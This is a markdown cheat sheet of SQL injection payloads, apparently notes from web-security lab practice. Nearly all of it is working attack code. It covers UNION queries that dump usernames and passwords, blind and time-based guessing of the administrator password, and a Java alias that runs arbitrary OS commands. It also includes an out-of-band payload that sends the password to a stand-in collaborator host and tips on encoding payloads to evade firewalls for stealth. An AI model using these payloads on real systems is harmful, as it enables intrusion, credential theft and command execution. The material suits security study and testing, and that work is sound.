# SQL Injection (SQLi) Attacks

## UNION-Based SQLi
Used when application displays query results in responses.
### Requirements
- Same number of columns.
- Compatible data types.
- Add comment using `#` or `--`.
### Determine Column Count
**Method 1: ORDER BY**
```sql
' ORDER BY 1--
' ORDER BY 2--
```

**Method 2: UNION SELECT NULLs**
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
```
If error occurs, number of columns is incorrect.

**For Oracle:**
Use `FROM DUAL`:
```sql
' UNION SELECT NULL FROM DUAL--
```
### Determine Writable Columns
Test each column with string:

```sql
' UNION SELECT 'a',NULL--
' UNION SELECT NULL,'a'--
```
If error, column can't hold string data.
### Database Version
List all databases:
```
' UNION SELECT NULL, schema_name, NULL FROM information_schema.schemata--
```
- **Make sure your input matches the number of columns determined from the previous step!** (above has 3 columns)
	- Make sure you are also querying information (such as `schema_name`) under the tables that allow strings
- `schema_name` refers to the tables
- `information_schema.schemata` contains all databases

```sql
-- MySQL
SELECT @@version
-- Oracle
SELECT * FROM v$version
-- PostgreSQL
SELECT version()
```
### List Tables and Columns
```sql
-- List tables
' UNION SELECT table_name, NULL FROM information_schema.tables--

-- List columns
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
```
- **Make sure your input matches the number of columns determined from the previous step!**
	- Make sure you are also querying information (such as `schema_name`) under the tables that allow strings
### Extract Table Data
```sql
' UNION SELECT username,password FROM users--
' UNION SELECT NULL,username,password FROM users--
```
### Concatenate Values (Oracle):
```sql
' UNION SELECT NULL,username || '~' || password FROM users--
```
## CLI with SQLi
### Creating a variable that will execute OS-level commands
This creates an alias (`EXEC_OS_COMMAND`) where we can execute commands:
```
'; CREATE ALIAS EXE_CMD AS 'String exec(String cmd) throws Exception { Process p = Runtime.getRuntime().exec(cmd); java.util.Scanner s = new java.util.Scanner(p.getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";}' --
```
- Ends the current SQL command.
- Creates a Java-based SQL function named `EXE_CMD` that can run **any system command**.
- Comments out the rest of the original SQL query to avoid syntax errors.

Execute commands with the following:
```
' union select NULL,NULL,EXE_CMD('whoami') --
```
- Executes `ls` command
- Uses 3 columns determined from previous UNION steps
## Blind SQLi
When responses do not include query results.
### Conditional Response
Example using cookie:
```http
Cookie: TrackingId=xyz' AND '1'='1
Cookie: TrackingId=xyz' AND '1'='2
```
### Extract Password for Known User
```sql
-- Confirm table
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
-- Confirm user
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
-- Determine password length
TrackingId=xyz' AND (SELECT LENGTH(password)>1 FROM users WHERE username='administrator')='a
-- Guess characters
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```
Use Burp Intruder to brute force characters. Adjust substring index to loop through the password.

## Time-Based Blind SQLi
Determine true/false conditions using delay.

### Example (PostgreSQL):
```sql
TrackingId=x'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```
Delay = True; No delay = False

### Exploit Example:
```sql
-- Confirm username exists
TrackingId=x'; SELECT CASE WHEN (username='administrator') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--
-- Guess password length
TrackingId=x'; SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--
-- Extract password
TrackingId=x'; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--
```
## Out-of-Band (OAST) SQLi
When application makes async SQL queries.
### Test with Burp Collaborator
```sql
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml version="1.0" encoding="UTF-8"%3f><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://COLLABORATOR/"> %remote;]>'),'/l') FROM dual--
```
### Exfiltrate Data
```sql
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml version="1.0" encoding="UTF-8"%3f><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.COLLABORATOR/"> %remote;]>'),'/l') FROM dual--
```
## Error-Based SQLi
Use error messages to infer or extract data.
### Test
```sql
TrackingId=xyz'
TrackingId=xyz''
TrackingId=xyz'||(SELECT '')||'
TrackingId=xyz'||(SELECT '' FROM dual)||'
TrackingId=xyz'||(SELECT '' FROM not_a_real_table)||'
```
### Exploit
```sql
-- Confirm table exists
TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
-- Force error based on condition
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```
## Encoding Techniques
- Start with raw payloads; if blocked, try URL encoding.
- If WAF blocks still occur, switch to Hex or Unicode encoding.
- Combine encoding methods (e.g., double encoding) for increased stealth.
### When Not to Encode
- Request body uses JSON, XML, or plaintext.
  Example: `{ "username": "admin' OR '1'='1" }`
- Cookies and Headers.

---

**Reference**: [PortSwigger SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

